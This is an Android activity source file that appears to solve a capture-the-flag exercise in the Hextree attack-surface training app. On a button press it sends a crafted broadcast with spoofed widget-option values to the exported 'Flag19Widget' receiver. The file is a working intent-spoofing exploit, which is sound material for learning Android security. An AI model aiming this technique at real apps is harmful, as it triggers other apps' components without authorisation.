package com.example.practicapp;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivityHextree extends AppCompatActivity {
    private int counting = 0;
    private Uri maliciousUri;

    BroadcastReceiver hijackReceiver;
    @RequiresApi(api = Build.VERSION_CODES.TIRAMISU)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        TextView t1 = findViewById(R.id.main_text);
        Button b1 = findViewById(R.id.intent_button);

        b1.setOnClickListener(v -> {

            Intent intent = new Intent();

            // 🔥 Critical action
            intent.setAction("com.attacker.APPWIDGET_UPDATE");
            intent.addFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES);
            // ✅ Explicitly target the vulnerable receiver
            intent.setClassName(
                    "io.hextree.attacksurface",
                    "io.hextree.attacksurface.receivers.Flag19Widget"
            );
            // 🔥 Fake widget options bundle
            Bundle options = new Bundle();
            options.putInt("appWidgetMaxHeight", 1094795585);
            options.putInt("appWidgetMinHeight", 322376503);

            intent.putExtra("appWidgetOptions", options);

            // Optional (not required but mimics real behavior)
//            intent.putExtra("appWidgetIds", new int[]{1});

            sendBroadcast(intent);
//            sendBroadcast(new Intent("android.appwidget.action.APPWIDGET_UPDATE"));
        });

    }
}
